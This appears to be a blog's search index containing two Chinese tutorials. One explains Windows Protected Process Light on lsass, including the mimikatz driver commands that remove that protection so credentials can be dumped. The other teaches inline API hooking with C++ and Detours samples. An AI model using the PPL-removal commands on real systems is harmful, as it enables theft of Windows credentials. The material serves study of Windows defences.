<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>/2024/04/29/BypassPPL/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="什么是受保护进程"><a href="#什么是受保护进程" class="headerlink" title="什么是受保护进程"></a>什么是受保护进程</h2><p>首先，Windows Vista &#x2F; Server 2008 引入了受保护进程的概念，其目的不是保护用户的数据或凭据，而是保护媒体内容以符合数字版权管理（DRM）的要求。例如，为了使蓝光媒体播放器能够读取内容同时防止复制，映像文件必须使用特殊的 Windows Media 证书进行数字签名。</p>
<p>在这种机制下，受保护的进程只能被未保护的进程访问非常有限的权限，如 PROCESS_QUERY_LIMITED_INFORMATION，PROCESS_SET_LIMITED_INFORMATION，PROCESS_TERMINATE 和 PROCESS_SUSPEND_RESUME</p>
<h2 id="什么是PPL"><a href="#什么是PPL" class="headerlink" title="什么是PPL"></a>什么是PPL</h2><p>在 Windows 8.1 &#x2F; Server 2012 R2，Microsoft 引入了 PPL（Protected Process Light）概念。PPL 是对先前“受保护进程”模型的扩展，并添加了“保护级别”的概念</p>
<p>PPL被用于很多安全关键的系统服务，例如 Windows Defender Antivirus 服务就运行在一个PPL环境下，从而防止恶意软件试图关闭或规避这个防病毒服务</p>
<p>需要注意的是，启用PPL保护的进程必须由 Microsoft 或者其他被信任的实体签名，因为PPL进程的创建和修改是受到严格控制的。这一点确保了恶意软件不能创建自己的PPL进程来规避系统的安全限制</p>
<h2 id="什么是TrustedInstaller权限"><a href="#什么是TrustedInstaller权限" class="headerlink" title="什么是TrustedInstaller权限"></a>什么是TrustedInstaller权限</h2><p>TrustedInstaller 是 Windows Vista 及其后续版本中引入的一个服务帐户。这个服务帐户在系统中具有非常高的权限级别，超过了常规的系统管理员权限。</p>
<p>TrustedInstaller 主要的作用是管理 Windows 的系统更新和系统组件的安装。很多核心的系统文件、注册表项和服务是由 TrustedInstaller 这个帐户拥有的，这样可以防止非授权的修改或删除这些关键的系统资源，从而提升系统的稳定性和安全性。</p>
<p>虽然管理员账户在 Windows 系统中具有很高的权限，但是对于 TrustedInstaller 拥有的文件或者服务，管理员账户默认是没有修改权限的。如果想要修改这些资源，管理员需要手动修改资源的所有权，将所有权从 TrustedInstaller 转移到管理员账户，然后再授予管理员账户相应的权限</p>
<p>​		</p>
<h1 id="PPL的加载与移除"><a href="#PPL的加载与移除" class="headerlink" title="PPL的加载与移除"></a>PPL的加载与移除</h1><h2 id="1-查看进程PPL"><a href="#1-查看进程PPL" class="headerlink" title="1.查看进程PPL"></a>1.查看进程PPL</h2><p>使用管理员权限打开ProcessExplorer，点击<code>View-&gt;Select Columns</code>, 勾选上<code>Protection</code>，这样就能看到进程的保护级别了</p>
<img src="BypassPPL/image-20230624111051587.png" alt="image-20230624111051587" style="zoom:67%;" />	

<img src="BypassPPL/image-20230624111148620.png" alt="image-20230624111148620" style="zoom:67%;" />	



<p>可以发现lsass进程默认是没有加PPL的，在这种情况下是可以使用mimikatz抓取密码</p>
<p><img src="/BypassPPL/image-20230624161432776.png" alt="image-20230624161432776"></p>
<p><img src="/BypassPPL/image-20230624164804354.png" alt="image-20230624164804354">	</p>
<h2 id="2-为lsass添加PPL"><a href="#2-为lsass添加PPL" class="headerlink" title="2.为lsass添加PPL"></a>2.为lsass添加PPL</h2><p>打开注册表找到<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>目录，添加个DWORD类型的键值<code>RunAsPPL</code>，并置其值为1</p>
<blockquote>
<p>LSA（Local Security Authority）是Windows操作系统中的一个重要组件，负责在用户登录系统时进行身份验证和生成访问令牌</p>
</blockquote>
<img src="BypassPPL/image-20230624165202200.png" alt="image-20230624165202200" style="zoom:67%;" />	



<p>重启系统后再次打开Process Explorer查看lsass进程，可以发现此进程被加了PPL</p>
<p><img src="/BypassPPL/image-20230624170118003.png" alt="image-20230624170118003"></p>
<p>​	</p>
<p>尝试使用mimikatz抓取密码，抓取失败，提示报错：<code>Handler on memory(0x00000005)</code></p>
<p><img src="/BypassPPL/image-20230624170336707.png" alt="image-20230624170336707">	</p>
<h2 id="3-分析mimikatz源码"><a href="#3-分析mimikatz源码" class="headerlink" title="3.分析mimikatz源码"></a>3.分析mimikatz源码</h2><p>根据报错提示，可以定位至<code>kuhl_m_sekurlsa.c</code>文件的<code>kuhl_m_sekurlsa_acquireLSA</code>函数，当<code>hData</code>变量的值为无效时，就会输出“Handle on memory”， 追踪<code>hData</code>变量</p>
<p><img src="/BypassPPL/image-20230624192725842.png" alt="image-20230624192725842"></p>
<img src="BypassPPL/image-20230624192835150.png" alt="image-20230624192835150" style="zoom:67%;" />	



<p>hData的值为lsass进程的句柄， OpenProcess函数返回了一个无效的句柄，也就是说由于PPL阻止了mimikatz打开lsass进程</p>
<p><img src="/BypassPPL/image-20230624193402178.png" alt="image-20230624193402178"></p>
<h2 id="4-mimikztz加载驱动"><a href="#4-mimikztz加载驱动" class="headerlink" title="4.mimikztz加载驱动"></a>4.mimikztz加载驱动</h2><p>可以加载mimikatz自带的驱动文件mimidrv.sys来移除lsass.exe的PPL保护，前提是你的mimikatz不会被查杀掉</p>
<ul>
<li><code>!+</code>: 加载mimidrv.sys驱动文件</li>
<li><code>!processprotect /process:lsass.exe /remove</code>: 移除对lsass进程的保护</li>
</ul>
<p><img src="/BypassPPL/image-20230624195300390.png" alt="image-20230624195300390">	</p>
<p>​	</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/29/Hook%E6%94%BB%E9%98%B2/</url>
    <content><![CDATA[<h1 id="Hook的概念"><a href="#Hook的概念" class="headerlink" title="Hook的概念"></a>Hook的概念</h1><h2 id="什么是Hook"><a href="#什么是Hook" class="headerlink" title="什么是Hook"></a>什么是Hook</h2><p>Hook（也被称为“挂钩子”）是一种程序设计模式，它提供了一种方式去截获（或者“挂钩子”在）系统级别或者应用级别的函数调用、消息、事件等。通过使用Hook，开发者可以在不修改源程序的情况下，改变或者扩展操作系统、应用程序、驱动程序的功能</p>
<h2 id="Hook的分类"><a href="#Hook的分类" class="headerlink" title="Hook的分类"></a>Hook的分类</h2><p>Hook通常分为两种形式，分别是修改函数代码和修改函数地址</p>
<h3 id="修改函数代码"><a href="#修改函数代码" class="headerlink" title="修改函数代码"></a>修改函数代码</h3><ul>
<li><strong>Inline Hook：</strong>Inline Hook即内联Hook，是指直接修改目标函数的代码，通常是将目标函数的前几个字节修改为跳转指令，使得执行流跳转到我们自己的代码中。此类Hook需要备份被修改的代码，以便在执行完我们的代码后能正确地返回</li>
</ul>
<h3 id="修改函数地址"><a href="#修改函数地址" class="headerlink" title="修改函数地址"></a>修改函数地址</h3><ul>
<li><strong>IAT HOOK：</strong>IAT（Import Address Table）是进程加载动态链接库时用到的一个表，存储了DLL函数的地址。IAT Hook就是修改这个表中的函数地址，将其指向我们的代码，从而实现Hook。</li>
<li><strong>SSDT HOOK：</strong>SSDT（System Service Descriptor Table）是Windows系统中用于保存系统服务例程地址的表。SSDT Hook就是修改这个表中的函数地址，实现Hook。</li>
<li><strong>IDT HOOK：</strong>IDT（Interrupt Descriptor Table）是用于保存中断处理函数地址的表。IDT Hook就是修改这个表中的函数地址，实现Hook。</li>
<li><strong>EAT HOOK：</strong>EAT（Export Address Table）是动态链接库对外提供服务的函数地址表，EAT Hook就是修改这个表中的函数地址，实现Hook。</li>
<li><strong>IRP HOOK：</strong>IRP（I&#x2F;O Request Packet）是Windows系统中用于描述I&#x2F;O请求的数据结构。IRP Hook是通过修改驱动程序的IRP处理函数的指针，将其指向我们的代码，从而实现Hook。</li>
</ul>
<h1 id="InlineHook"><a href="#InlineHook" class="headerlink" title="InlineHook"></a>InlineHook</h1><h2 id="什么是InlineHook"><a href="#什么是InlineHook" class="headerlink" title="什么是InlineHook"></a>什么是InlineHook</h2><p>Inline Hook，又称为超级Hook，是一种强大而又灵活的Hook技术。</p>
<p>Inline Hook的主要思想就是直接修改目标函数的代码，通常是在目标函数的开头插入一个跳转指令（jmp）。这个跳转指令会将程序的执行流跳转到我们自定义的函数中。</p>
<p>在我们的自定义函数中，我们可以执行任意的代码，然后再跳回目标函数的剩余部分。这样，我们就可以在不改变目标函数原有逻辑的基础上，添加自己的功能</p>
<h2 id="一个简单的Hook实例"><a href="#一个简单的Hook实例" class="headerlink" title="一个简单的Hook实例"></a>一个简单的Hook实例</h2><p>首先用C语言创建一个简单的加法程序</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ADD</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> a, b;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d,%d&quot;</span>,&amp;a, &amp;b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;结果是：%d&quot;</span>, <span class="built_in">ADD</span>(a, b));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>将程序拖入OD中，并且找到Add函数的call的地址并在此处下个断点</p>
<p><img src="/Hook%E6%94%BB%E9%98%B2/image-20230614220510557.png" alt="image-20230614220510557"></p>
<p>OD运行程序输入数据，这里我们输入1,2</p>
<p><img src="/Hook%E6%94%BB%E9%98%B2/image-20230614220602636.png" alt="image-20230614220602636">	</p>
<p>F7进入Add函数的call，通过右下角的堆栈窗口可以查看上述输入的实参（1，2），也就是说，如果将这个堆栈里的参数值给修改了，那么就可以修改函数的返回值</p>
<p><img src="/Hook%E6%94%BB%E9%98%B2/image-20230614220700796.png" alt="image-20230614220700796"></p>
<p>首先在函数头部地址添加一个JMP汇编指令，跳转的地址是任意的，只要这个地址周围没有指令，这里以跳转到401045为例</p>
<p><img src="/Hook%E6%94%BB%E9%98%B2/image-20230614220901386.png" alt="image-20230614220901386">	</p>
<p>红色部分的汇编指令就是我们自行创建的，以此来实现修改堆栈中的函数参数值</p>
<p>这里也要注意平衡堆栈，原先的call是有<code>push ebp</code>和<code>mov ebp,esp</code>指令的,由于添加了jmp指令导致它们被覆盖,所以这里要添上</p>
<p>最后的jmp指令再跳转回到401003	</p>
<p><img src="/Hook%E6%94%BB%E9%98%B2/image-20230614221037045.png" alt="image-20230614221037045">	</p>
<p>最后程序运行结果为9,这是因为我们把参数从原先的1和2, 修改成了4和5</p>
<p><img src="/Hook%E6%94%BB%E9%98%B2/image-20230614221139586.png" alt="image-20230614221139586">	</p>
<h2 id="代码实现思路"><a href="#代码实现思路" class="headerlink" title="代码实现思路"></a>代码实现思路</h2><p>这里我们会介绍两种实现 Inline Hook 的方法：</p>
<ol>
<li>使用 <code>jmp</code> 指令：这种方法通过插入一条 <code>jmp</code> 指令到目标函数的开始，使得函数在调用时直接跳转到我们自定义的函数。这里需要计算 <code>jmp</code> 后面的地址，因为 <code>jmp</code> 指令的目标地址是相对于下一条指令的位置计算的。计算公式为：<code>jmp</code> 后面的地址 &#x3D; 目的地址 - 源地址 - 5。其中，5 是 <code>jmp</code> 指令的字节数。</li>
<li>使用 <code>mov eax, address</code> 和 <code>jmp eax</code> 指令：这种方法首先把自定义函数的地址加载到 <code>eax</code> 寄存器，然后使用 <code>jmp eax</code> 跳转到该地址。这样，当目标函数被调用时，它会直接跳转到我们自定义的函数。</li>
</ol>
<p>这两种方法各有优劣。使用 <code>jmp</code> 指令的方法简洁直观，但对源地址和目的地址的位置有一定的限制，如果目标和源地址之间的距离过大，可能导致 <code>jmp</code> 指令无法正确跳转。而使用 <code>mov eax, address</code> 和 <code>jmp eax</code> 的方法则没有这个问题，但需要更多的指令，可能会覆盖掉目标函数的更多代码</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="1-借助eax间接jmp"><a href="#1-借助eax间接jmp" class="headerlink" title="1.借助eax间接jmp"></a>1.借助eax间接jmp</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span>   </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span>    </span></span><br><span class="line">BYTE NewCode[<span class="number">7</span>] = &#123; <span class="number">0xB8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xFF</span> ,<span class="number">0xE0</span> &#125;;  <span class="comment">// 新代码，用于Hook</span></span><br><span class="line">BYTE OldCode[<span class="number">7</span>] = &#123; <span class="number">0</span> &#125;;                                     <span class="comment">// 旧代码，用于保存被Hook函数的原始字节</span></span><br><span class="line">FARPROC MessageBoxAddress;                                   <span class="comment">// MessageBox函数的地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义的MessageBoxA函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">MyMessageBoxA</span><span class="params">(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;MessageBoxA 已经被Hook\n&quot;</span>);  <span class="comment">// 打印信息</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 在调用原始函数之前，恢复原始代码</span></span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(INVALID_HANDLE_VALUE, (<span class="type">void</span>*)MessageBoxAddress, (<span class="type">void</span>*)OldCode, <span class="number">7</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 调用原始的MessageBoxA函数</span></span><br><span class="line">	<span class="type">int</span> ret = <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Hello World&quot;</span>, <span class="string">&quot;Title&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 在调用原始函数之后，再次将Hook代码写入</span></span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(INVALID_HANDLE_VALUE, (<span class="type">void</span>*)MessageBoxAddress, (<span class="type">void</span>*)NewCode, <span class="number">7</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InlineHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HMODULE hModule_User32 = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;user32.dll&quot;</span>);  <span class="comment">//加载user32.dll模块</span></span><br><span class="line">	MessageBoxAddress = <span class="built_in">GetProcAddress</span>(hModule_User32, <span class="string">&quot;MessageBoxA&quot;</span>);  <span class="comment">//获取MessageBoxA函数的地址</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;MessageBoxA Addr is %x\n&quot;</span>, MessageBoxAddress);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;MyMessageBoxA Addr is %x\n&quot;</span>, MyMessageBoxA);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 读取MessageBoxA函数的前7个字节，并保存在OldCode数组中</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">ReadProcessMemory</span>(INVALID_HANDLE_VALUE, MessageBoxAddress, OldCode, <span class="number">7</span>, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ReadProcessMemory error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;OldCode is %x%x%x%x%x%x%x\n&quot;</span>, OldCode[<span class="number">0</span>], OldCode[<span class="number">1</span>], OldCode[<span class="number">2</span>], OldCode[<span class="number">3</span>], OldCode[<span class="number">4</span>], OldCode[<span class="number">5</span>], OldCode[<span class="number">6</span>]);</span><br><span class="line"></span><br><span class="line">	DWORD JmpAddress = (DWORD)MyMessageBoxA - (DWORD)MessageBoxAddress - <span class="number">5</span>;  <span class="comment">// 获取自定义的MessageBoxA函数的地址</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;NewCode[<span class="number">1</span>], &amp;JmpAddress, <span class="number">4</span>);  <span class="comment">// 将地址写入到NewCode的第二个字节开始的位置</span></span><br><span class="line"></span><br><span class="line">	DWORD dwOldProtect = <span class="number">0</span>;  <span class="comment">// 用于保存原始页保护</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;NewBytes is %x%x%x%x%x\n&quot;</span>, NewCode[<span class="number">0</span>], NewCode[<span class="number">1</span>], NewCode[<span class="number">2</span>], NewCode[<span class="number">3</span>], NewCode[<span class="number">4</span>], NewCode[<span class="number">5</span>], NewCode[<span class="number">6</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用VirtualProtect函数改变MessageBoxA函数所在页的保护属性，使其可读可写可执行。</span></span><br><span class="line">	<span class="built_in">VirtualProtect</span>(MessageBoxAddress, <span class="number">7</span>, PAGE_EXECUTE_READWRITE,&amp;dwOldProtect);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 使用WriteProcessMemory函数将我们的Hook代码写入到MessageBoxA函数的开头。</span></span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(INVALID_HANDLE_VALUE, MessageBoxAddress, NewCode, <span class="number">7</span>,<span class="literal">NULL</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 使用VirtualProtect函数恢复MessageBoxA函数所在页的保护属性。</span></span><br><span class="line">	<span class="built_in">VirtualProtect</span>(MessageBoxAddress, <span class="number">7</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="built_in">InlineHook</span>();</span><br><span class="line">	<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Hello World&quot;</span>, <span class="string">&quot;Title&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该代码首先将自定义函数<code>MyMessageBoxA</code>的地址加载到<code>eax</code>寄存器，然后通过<code>jmp eax</code>指令跳转到<code>MyMessageBoxA</code>。<code>OldCode</code>用于保存原始的<code>MessageBoxA</code>函数的前7个字节</p>
<p>然后通过<code>WriteProcessMemory</code>函数恢复原始的<code>MessageBoxA</code>函数的前7个字节，接着调用原始的<code>MessageBoxA</code>函数，最后再次通过<code>WriteProcessMemory</code>函数将<code>NewCode</code>写回到<code>MessageBoxA</code>函数的开头，以确保下次调用<code>MessageBoxA</code>时仍然会被Hook</p>
<p>在<code>InlineHook</code>函数中，程序首先获取<code>MessageBoxA</code>函数的地址，然后读取该地址的前7个字节并保存在<code>OldCode</code>数组中，接着计算出<code>MyMessageBoxA</code>函数的地址与<code>MessageBoxA</code>函数的地址之间的偏移量并保存在<code>NewCode</code>数组的第二个字节开始的位置，然后通过<code>VirtualProtect</code>函数修改<code>MessageBoxA</code>函数所在页的保护属性使其可读可写可执行，最后通过<code>WriteProcessMemory</code>函数将<code>NewCode</code>写入到<code>MessageBoxA</code>函数的开头</p>
<h3 id="2-直接jmp"><a href="#2-直接jmp" class="headerlink" title="2.直接jmp"></a>2.直接jmp</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">BYTE JmpOriginal[<span class="number">5</span>] = &#123; <span class="number">0xE9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;  <span class="comment">// 用于跳转到MyMessageBoxA的指令，0xE9代表JMP指令</span></span><br><span class="line">BYTE OldCode[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;                      <span class="comment">// 存储原始MessageBoxA的前5个字节</span></span><br><span class="line">FARPROC MessageBoxAddress;                    <span class="comment">// MessageBoxA的函数地址</span></span><br><span class="line"><span class="type">void</span>* Trampoline;                             <span class="comment">// 桥接函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义的MessageBoxA函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">MyMessageBoxA</span><span class="params">(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;MessageBoxA 已经被Hook\n&quot;</span>);  <span class="comment">// 打印被Hook的信息</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用桥接函数调用原始的MessageBoxA，这里需要类型转换</span></span><br><span class="line">    <span class="type">int</span> ret = ((<span class="built_in">int</span> (WINAPI*)(HWND, LPCTSTR, LPCTSTR, UINT))Trampoline)(hWnd, lpText, lpCaption, uType);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InlineHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hModule_User32 = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;user32.dll&quot;</span>);  <span class="comment">// 加载user32.dll模块</span></span><br><span class="line">    MessageBoxAddress = <span class="built_in">GetProcAddress</span>(hModule_User32, <span class="string">&quot;MessageBoxA&quot;</span>);  <span class="comment">// 获取MessageBoxA的函数地址</span></span><br><span class="line"></span><br><span class="line">    DWORD JmpAddress = (DWORD)MyMessageBoxA - (DWORD)MessageBoxAddress - <span class="number">5</span>;  <span class="comment">// 计算跳转到MyMessageBoxA的地址</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;JmpOriginal[<span class="number">1</span>], &amp;JmpAddress, <span class="number">4</span>);  <span class="comment">// 将跳转地址复制到JmpOriginal的第二个字节</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), MessageBoxAddress, OldCode, <span class="number">5</span>, <span class="literal">NULL</span>);  <span class="comment">// 读取并保存MessageBoxA的前5个字节</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配10个字节的内存空间作为桥接函数</span></span><br><span class="line">    Trampoline = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">10</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(Trampoline, OldCode, <span class="number">5</span>);  <span class="comment">// 复制MessageBoxA的前5个字节到桥接函数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算并写入桥接函数的跳回地址</span></span><br><span class="line">    DWORD jmpBackAddr = (DWORD)MessageBoxAddress + <span class="number">5</span> - (DWORD)Trampoline - <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)((DWORD)Trampoline + <span class="number">5</span>), &amp;JmpOriginal[<span class="number">0</span>], <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)((DWORD)Trampoline + <span class="number">6</span>), &amp;jmpBackAddr, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    <span class="comment">// 修改MessageBoxA的前5个字节的页属性，使其可读可写可执行</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>(MessageBoxAddress, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 替换MessageBoxA的前5个字节为跳转到MyMessageBoxA的指令</span></span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), MessageBoxAddress, &amp;JmpOriginal[<span class="number">0</span>], <span class="number">5</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复MessageBoxA的前5个字节的原始页属性</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>(MessageBoxAddress, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">InlineHook</span>();  <span class="comment">// 实施Inline Hook</span></span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Hello World&quot;</span>, <span class="string">&quot;Title&quot;</span>, MB_OK);  <span class="comment">// 调用MessageBoxA函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与上述代码不同的是, 这里需计算跳转到我们自定义的MyMessageBoxA函数的跳转指令。除此之外，我们还在虚拟内存分配了一块区域用来存放被覆盖的原始代码，并在其后面添加一个跳转指令，使其能够返回被Hook的函数，这样做的好处是可以避免每次调用hook函数时都需要恢复和再次修改被Hook的函数代码</p>
<h3 id="3-使用detours库"><a href="#3-使用detours库" class="headerlink" title="3.使用detours库"></a>3.使用detours库</h3><p>在windows 10操作系统中由于ASLR(地址随机化)的缘故，手工实现InLine比较麻烦，这里使用微软的一个轻量级的开源库Detours，</p>
<p>Detours 是一个由 Microsoft Research 开发的库，用于钩取和修改 Windows API 调用和其他函数调用。你可以从其 GitHub 仓库下载它：<a href="https://github.com/microsoft/Detours">https://github.com/microsoft/Detours</a></p>
<p>这里我使用vcpkg来按照Detours库，运行如下命令，至于如何安装和使用vcpkg可以看这篇文章：<a href="https://blog.csdn.net/xf555er/article/details/130465197">https://blog.csdn.net/xf555er/article/details/130465197</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vcpkg install detours</span><br></pre></td></tr></table></figure>



<p>以下是具体的实现代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours/detours.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个函数指针OldMessageBoxA，指向MessageBoxA函数</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">int</span> <span class="params">(WINAPI* OldMesssageBoxA)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT uType</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span> </span>= MessageBoxA;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义函数MyFunction0，当MessageBoxA被调用时，会跳转到这个函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">MyFunction0</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 在这个函数中，调用原来的MessageBoxA函数，显示特定的信息</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">OldMesssageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Hook Success!&quot;</span>, <span class="string">&quot;Warming&quot;</span>, MB_OKCANCEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 开始一次新的Detour操作</span></span><br><span class="line">    <span class="built_in">DetourTransactionBegin</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 告诉Detour这个线程将被影响</span></span><br><span class="line">    <span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将OldMessageBoxA函数指针替换为MyFunction0，也就是说当MessageBoxA被调用时，跳转到MyFunction0</span></span><br><span class="line">    <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldMesssageBoxA, MyFunction0);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果需要移除Hook，可以调用DetourDetach</span></span><br><span class="line">    <span class="comment">// DetourDetach(&amp;(PVOID&amp;)OldMesssageBoxA, MyFunction0);</span></span><br><span class="line">    <span class="comment">// 